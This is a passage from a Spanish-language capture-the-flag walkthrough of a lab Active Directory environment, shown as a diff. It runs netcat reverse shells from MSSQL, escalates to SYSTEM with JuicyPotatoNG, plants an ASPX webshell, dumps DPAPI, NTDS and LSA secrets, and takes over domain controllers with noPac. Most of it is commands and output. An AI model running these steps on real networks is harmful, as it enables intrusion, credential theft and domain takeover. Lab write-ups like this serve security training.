+  CredentialType      : Generic
+  PersistenceType     : LocalComputer
+  LastWriteTime       : 4/2/2021 7:08:44 AM
+
+[*] Completed collection in 0.02 seconds
+
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las credenciales son validas y podemos conectarnos con <code class="language-plaintext highlighter-rouge">mssqlclient</code> a WEB01</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-mssqlclient </span><span class="p">sa:MySAisL33TM4n@web01.daedalus.local
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(WEB01): Line 1: Changed database context to 'master'.
+[*] INFO(WEB01): Line 1: Changed language setting to us_english.  
+[*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
+[!] Press help for extra shell commands
+SQL&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya dentro de mssql podemos ejecutar comandos haciendo uso de <code class="language-plaintext highlighter-rouge">xp_cmdshell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; xp_cmdshell whoami  
+
+output
+----------------------
+nt service\mssqlserver
+
+SQL&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para obtener una revshell usaremos <code class="language-plaintext highlighter-rouge">netcat.exe</code> que habiamos subido de antes para enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code>, que recibimos como la cuenta de servicio de mssql</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; xp_cmdshell cmd /c C:\ProgramData\netcat.exe -e powershell 10.10.14.10 443  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.20
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\System32&gt; </span><span class="am">whoami</span><span class="p">
+nt service\mssqlserver
+PS C:\Windows\System32&gt; </span><span class="am">hostname</span><span class="p">
+WEB01
+PS C:\Windows\System32&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ser una cuenta de servicio este usuario tiene el <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado que nos permite suplantar a otros usuarios, incluso <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Windows\System32&gt; </span><span class="am">whoami </span><span class="p">/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========  
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+PS C:\Windows\System32&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Descargamos <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a> y ejecutamos nuevamente netcat para enviar una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">curl </span><span class="p">10.10.14.10/JuicyPotatoNG.exe </span><span class="c1">-o </span><span class="p">JuicyPotatoNG.exe
+PS C:\ProgramData&gt; </span><span class="am">.\JuicyPotatoNG.exe </span><span class="c1">-t </span><span class="p">* </span><span class="c1">-p </span><span class="p">C:\ProgramData\netcat.exe </span><span class="c1">-a </span><span class="az">'-e powershell 10.10.14.10 443' </span><span class="p"> 
+
+	 JuicyPotatoNG
+	 by decoder_it &amp; splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
+[+] CreateProcessAsUser OK
+[+] Exploit successful! 
+
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La shell que recibimos esta vez es como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> el cual tiene maximos privilegios sobre el equipo donde nos encontramos que es <code class="language-plaintext highlighter-rouge">WEB01</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.20
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\&gt; </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\&gt; </span><span class="am">hostname</span><span class="p">
+WEB01
+PS C:\&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra2">
+<br><h3 class="post-title">Extra 2</h3>
+<h4 class="post-title">Machine Credentials - Administrator DC1</h4><br>
+
+<p class="plain-text">Antes en WEB01 usabamos <a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a> para buscar credenciales pero si buscamos credenciales de maquinas, encontramos las de <code class="language-plaintext highlighter-rouge">Administrator</code> a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">.\SharpDPAPI.exe </span><span class="p">machinecredentials
+
+  __                 _   _       _ ___
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                |
+  v1.11.3
+
+
+[*] Action: Machine DPAPI Credential Triage
+
+[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+[*] RevertToSelf()
+
+[*] Secret  : DPAPI_SYSTEM
+[*]    full: E7BC9098EA7313E0B042679565EDF75CAD219106D3FE11B0F39C1F1E4EAEA01DC393F563C6190EC7
+[*]    m/u : E7BC9098EA7313E0B042679565EDF75CAD219106 / D3FE11B0F39C1F1E4EAEA01DC393F563C6190EC7  
+
+[*] Triaging System Credentials
+
+Folder       : C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+  CredFile           : ADBAA7254AF7B3AC4CBF7B8CE9BD6911
+
+    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
+    size             : 560
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    LastWritten      : 10/13/2020 10:49:57 AM
+    TargetName       : Domain:batch=TaskScheduler:Task:{27B6CB8A-0163-46AB-A0C7-387E45A70048}
+    TargetAlias      :
+    Comment          :
+    UserName         : WEB01\svc_dev
+    Credential       : a2W@rWAHzG+zQrB4
+
+  CredFile           : AF61A1B16221450058FB4D69F7B3FE73
+
+    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
+    size             : 560
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    LastWritten      : 10/14/2020 10:15:19 AM
+    TargetName       : Domain:batch=TaskScheduler:Task:{64EDB31F-E848-4632-8F9F-377559BFA088}
+    TargetAlias      :
+    Comment          :
+    UserName         : WEB01\Administrator
+    Credential       : EXuLyX_WtHxx9pS9
+
+  CredFile           : CEED724993CAA9310FC2FE2F72ECE137
+
+    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
+    size             : 592
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    LastWritten      : 10/13/2020 2:56:34 AM
+    TargetName       : Domain:batch=TaskScheduler:Task:{D3000B16-D5D6-4FF3-9038-F368155DBB77}
+    TargetAlias      :
+    Comment          :
+    UserName         : DAEDALUS\Administrator
+    Credential       : pleasefastenyourseatbelts01!
+
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos la contraseña con <code class="language-plaintext highlighter-rouge">crackmapexec</code> hacia el DC1 y devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -u Administrator -p pleasefastenyourseatbelts01!
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">daedalus.local\Administrator:pleasefastenyourseatbelts01! </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Solo nos resta conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> usando la contraseña de <code class="language-plaintext highlighter-rouge">Administrator</code> hacia el <code class="language-plaintext highlighter-rouge">DC1</code> y obtener una <code class="language-plaintext highlighter-rouge">powershell</code> comprometiendo todo el primer dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm </span><span class="p">-i dc1.daedalus.local -u Administrator -p pleasefastenyourseatbelts01!  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
+daedalus\administrator
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">type</span><span class="p"> ..\Desktop\flag.txt
+ASCENSION{0G_adm1ni5tR@tor}
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra3">
+<br><h3 class="post-title">Extra 3</h3>
+<h4 class="post-title">IIS Account Service - Administrator MS01</h4><br>
+
+<p class="plain-text">Volviendo a la revshell como <code class="language-plaintext highlighter-rouge">elliot en MS01</code>, sabemos que la web es un <code class="language-plaintext highlighter-rouge">IIS</code> por lo que deberia correr <code class="language-plaintext highlighter-rouge">aspx</code>, podemos subir una <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx">webshell</a> al directorio principal</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\inetpub\wwwroot&gt; </span><span class="am">whoami</span><span class="p">
+megaairline\elliot
+PS C:\inetpub\wwwroot&gt; </span><span class="am">curl </span><span class="p">192.168.11.6/cmd.aspx </span><span class="c1">-o </span><span class="p">cmd.aspx  
+PS C:\inetpub\wwwroot&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cargamos el <code class="language-plaintext highlighter-rouge">cmd.aspx</code> en la web y nos lo interpreta, al ejecutar el comando <code class="language-plaintext highlighter-rouge">whoami</code> logramos ejecutar comandos como una cuenta de servicio en el equipo <code class="language-plaintext highlighter-rouge">MS01</code></p>
+<a href="/endgames/ascension/24.png" target="_blank"><div><p><img src="/endgames/ascension/24.png"></p></div></a>
+
+<p class="plain-text">Para obtener una <code class="language-plaintext highlighter-rouge">powershell</code> aprovecharemos lo que teniamos con <code class="language-plaintext highlighter-rouge">netsh</code> para asi enviarnos una powershell al <code class="language-plaintext highlighter-rouge">DC1</code> que lo redirigira a nuestro equipo por el <code class="language-plaintext highlighter-rouge">4444</code></p>
+<a href="/endgames/ascension/25.png" target="_blank"><div><p><img src="/endgames/ascension/25.png"></p></div></a>
+
+<p class="plain-text">En nuestro listener de <code class="language-plaintext highlighter-rouge">netcat</code> obtenemos una shell como una cuenta de servicio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ netcat </span><span class="p">-lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.13.38.20
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\windows\system32\inetsrv&gt; </span><span class="am">whoami</span><span class="p">
+iis apppool\defaultapppool
+PS C:\windows\system32\inetsrv&gt; </span><span class="am">hostname</span><span class="p">
+MS01
+PS C:\windows\system32\inetsrv&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ser una cuenta de servicio este usuario tiene el <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado que nos permite suplantar a otros usuarios, incluso <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\windows\system32\inetsrv&gt; </span><span class="am">whoami </span><span class="p">/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========  
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+PS C:\windows\system32\inetsrv&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Descargamos <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a> y ejecutamos nuevamente netcat para enviar una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">curl </span><span class="p">192.168.11.6/JuicyPotatoNG.exe </span><span class="c1">-o </span><span class="p">JuicyPotatoNG.exe
+PS C:\ProgramData&gt; </span><span class="am">.\JuicyPotatoNG.exe </span><span class="c1">-t </span><span class="p">* </span><span class="c1">-p </span><span class="p">netcat.exe </span><span class="c1">-a </span><span class="az">'-e powershell 192.168.11.6 4444'</span><span class="p">
+
+         JuicyPotatoNG
+         by decoder_it &amp; splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation  
+[+] CreateProcessAsUser OK
+[+] Exploit successful!
+
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La shell que recibimos esta vez es como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> el cual tiene maximos privilegios sobre el equipo donde nos encontramos que es <code class="language-plaintext highlighter-rouge">MS01</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ netcat </span><span class="p">-lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.13.38.20
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\&gt; </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\&gt; </span><span class="am">hostname</span><span class="p">
+MS01
+PS C:\&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra4">
+<br><h3 class="post-title">Extra 4</h3>
+<h4 class="post-title">CVE-2021-42278 / CVE-2021-42287 - Administrator (DC1 / DC2)</h4><br>
+
+<p class="plain-text">Como alternativa podemos usar <a href="https://github.com/Ridter/noPac">noPac</a> donde aunque el parametro <code class="language-plaintext highlighter-rouge">-shell</code> no funcionará directamente si que nos creara un ticket como <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ python3 </span><span class="p">noPac.py daedalus.local/billing_user:D43d4lusB1ll1ngB055 -use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[-] Resolved Failed: None of DNS query names exist: DC1.daedalus.local., DC1.daedalus.local.localdomain.  
+[*] Selected Target dc1.daedalus.local
+[*] Total Domain Admins 1
+[*] will try to impersonate Administrator
+[*] Adding Computer Account "WIN-KQZHNAXLNYM$"
+[*] MachineAccount "WIN-KQZHNAXLNYM$" password = ^FLg%fP6!Q)#
+[*] Successfully added machine account WIN-KQZHNAXLNYM$ with password ^FLg%fP6!Q)#.
+[*] WIN-KQZHNAXLNYM$ object = CN=WIN-KQZHNAXLNYM,CN=Computers,DC=daedalus,DC=local
+[*] WIN-KQZHNAXLNYM$ sAMAccountName == dc1
+[*] Saving a DC's ticket in dc1.ccache
+[*] Reseting the machine account to WIN-KQZHNAXLNYM$
+[*] Restored WIN-KQZHNAXLNYM$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] Saving a user's ticket in Administrator.ccache
+[*] Rename ccache to Administrator_dc1.daedalus.local.ccache
+[*] Attempting to del a computer with the name: WIN-KQZHNAXLNYM$
+[-] Delete computer WIN-KQZHNAXLNYM$ Failed! Maybe the current user does not have permission.
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator_dc1.daedalus.local.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este punto podemos usar el <code class="language-plaintext highlighter-rouge">ticket</code> para autenticarnos contra la maquina y obtener una shell en el <code class="language-plaintext highlighter-rouge">DC1</code> por lo que nos saltamos el resto de explotaciones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-wmiexec </span><span class="p">dc1.daedalus.local -k -no-pass -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\&gt; </span><span class="am">whoami</span><span class="p">
+daedalus\administrator
+
+PS C:\&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como nos autenticamos como <code class="language-plaintext highlighter-rouge">Administrator</code> podemos dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> para ver todos los <code class="language-plaintext highlighter-rouge">hashes</code> NT del dominio con los que podemos hacer un <code class="language-plaintext highlighter-rouge">passthehash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -k --use-kcache --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="ve">[+] </span><span class="p">daedalus.local\Administrator from ccache </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a3ff633d308be8e06dbb4e2e88783533:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e1e73de1f69e094386b8496fdbdaa90:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">daedalus.local\elliot:1112:aad3b435b51404eeaad3b435b51404ee:74fdf381a94e1e446aaedf1757419dcd:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">daedalus.local\svc_backup:1602:aad3b435b51404eeaad3b435b51404ee:f913cd9d773be0d48389d45a20b6364a:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">daedalus.local\billing_user:1603:aad3b435b51404eeaad3b435b51404ee:65043c86ce4386582442450feed8ce53:::  
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">DC1$:1000:aad3b435b51404eeaad3b435b51404ee:c5a43d3b4bb5b1e5aa0c0fd1fc33a8fb:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">WEB01$:1109:aad3b435b51404eeaad3b435b51404ee:cea841ef31ca13817f6d6c73b3c26b1a:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">WIN-KQZHNAXLNYM$:9103:aad3b435b51404eeaad3b435b51404ee:fa643e23dd63ddd0af802b010b43fc26:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">MEGAAIRLINE$:1108:aad3b435b51404eeaad3b435b51404ee:f68f00c91f2b98c63593309aa61ae76d:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarmos como <code class="language-plaintext highlighter-rouge">Administrator</code> a DC1 y obtener una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm </span><span class="p">-i dc1.daedalus.local -u Administrator -H a3ff633d308be8e06dbb4e2e88783533  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
+daedalus\administrator
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">hostname</span><span class="p">
+DC1
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque si dumpeamos los secretos <code class="language-plaintext highlighter-rouge">lsa</code> encontramos una contraseña en texto plano para <code class="language-plaintext highlighter-rouge">Administrator</code>, tambien es valida pero en este caso a nivel de <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -k --use-kcache --lsa         
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="ve">[+] </span><span class="p">daedalus.local\Administrator from ccache </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="ve">[+] </span><span class="p">Dumping LSA secrets
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">MEGAAIRLINE.LOCAL/Administrator:$DCC2$10240#Administrator#3ea6e70c7142de7e521195f33086a2bf: (2020-10-13 12:53:58)
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">DAEDALUS\DC1$:plain_password_hex:80ee1497c9f6cc7d6116bdd95938572bbab0d4bdf022ba201d1e4dbab1d7ead524c8eff4bc4a864c7569f6dff30c89914d9f83e47840a8e7705bb9c2dc0b8be208e88e5a846e94f70310c249bac1cef10803a83bd9bab790a6d02146918775ff6bff9d8c082378c0f783d4a9a29fb3eb81775f8eac2e0f62075503f39209ea18634b7a58e180e43cfe49cbc46801ed9a3a57a9033940a8867be1febd9dc9340abcab572f3999a0f279538b964ed3e16aa32e2d5567089a6835be29297f44171204163280c96755b5889278b2bd21a7da8c289462368bb1357d2f9ef0d64a16d23c5307464ba912c36be823632adb11e4  
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">DAEDALUS\DC1$:aad3b435b51404eeaad3b435b51404ee:c5a43d3b4bb5b1e5aa0c0fd1fc33a8fb:::
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">DAEDALUS\administrator:pleasefastenyourseatbelts01!
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">dpapi_machinekey:0xee3ee8172d485d91d928e75a6199a2d9d1552d2a
+</span><span class="am">dpapi_userkey:0x872350e7691cd1f10c04962e21f42f7921a64796
+</span><span class="az">SMB         </span><span class="p">dc1.daedalus.local 445    DC1              </span><span class="am">NL$KM:4d9aaba35a7a2f5025fc831a10fe1ea5d3b99da8b54eeb602bd678537b732ae044a8770c4836372680d02c90d416aae566534b7fa92d50998a260a20400d9be1</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con esta contraseña tambien podriamos conectarnos al <code class="language-plaintext highlighter-rouge">DC1</code> usando <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm</span><span class="p"> -i dc1.daedalus.local -u Administrator -p pleasefastenyourseatbelts01!  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
+daedalus\administrator
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">hostname</span><span class="p">
+DC1
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Pasa exactamente lo mismo con el segundo <code class="language-plaintext highlighter-rouge">dominio</code>, al ejecutar <code class="language-plaintext highlighter-rouge">noPac</code> obtenemos un ticket como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> con el que podemos autenticarnos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ python3 </span><span class="p">noPac.py megaairline.local/elliot:</span><span class="am">'84@m!n@9' </span><span class="p">-use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[-] Resolved Failed: None of DNS query names exist: DC2.megaairline.local., DC2.megaairline.local.localdomain.  
+[*] Selected Target dc2.megaairline.local
+[*] Total Domain Admins 1
+[*] will try to impersonate Administrator
+[*] Adding Computer Account "WIN-DWYFTZ3RGAP$"
+[*] MachineAccount "WIN-DWYFTZ3RGAP$" password = BjrmCo7b)vx5
+[*] Successfully added machine account WIN-DWYFTZ3RGAP$ with password BjrmCo7b)vx5.
+[*] WIN-DWYFTZ3RGAP$ object = CN=WIN-DWYFTZ3RGAP,CN=Computers,DC=megaairline,DC=local
+[*] WIN-DWYFTZ3RGAP$ sAMAccountName == dc2
+[*] Saving a DC's ticket in dc2.ccache
+[*] Reseting the machine account to WIN-DWYFTZ3RGAP$
+[*] Restored WIN-DWYFTZ3RGAP$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] Saving a user's ticket in Administrator.ccache
+[*] Rename ccache to Administrator_dc2.megaairline.local.ccache
+[*] Attempting to del a computer with the name: WIN-DWYFTZ3RGAP$
+[-] Delete computer WIN-DWYFTZ3RGAP$ Failed! Maybe the current user does not have permission.
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator_dc2.megaairline.local.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este punto podemos usar el <code class="language-plaintext highlighter-rouge">ticket</code> para autenticarnos contra la maquina y obtener una shell en el <code class="language-plaintext highlighter-rouge">DC2</code> por lo que nos saltamos el resto de explotaciones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-wmiexec </span><span class="p">dc2.megaairline.local -k -no-pass -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\&gt; </span><span class="am">whoami</span><span class="p">
+megaairline\administrator
+
+PS C:\&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como nos autenticamos como <code class="language-plaintext highlighter-rouge">Administrator</code> podemos dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> para ver todos los <code class="language-plaintext highlighter-rouge">hashes</code> NT del dominio con los que podemos hacer un <code class="language-plaintext highlighter-rouge">passthehash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc2.megaairline.local -k --use-kcache --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="ve">[+] </span><span class="p">megaairline.local\Administrator from ccache </span><span class="am">(Pwn3d!)
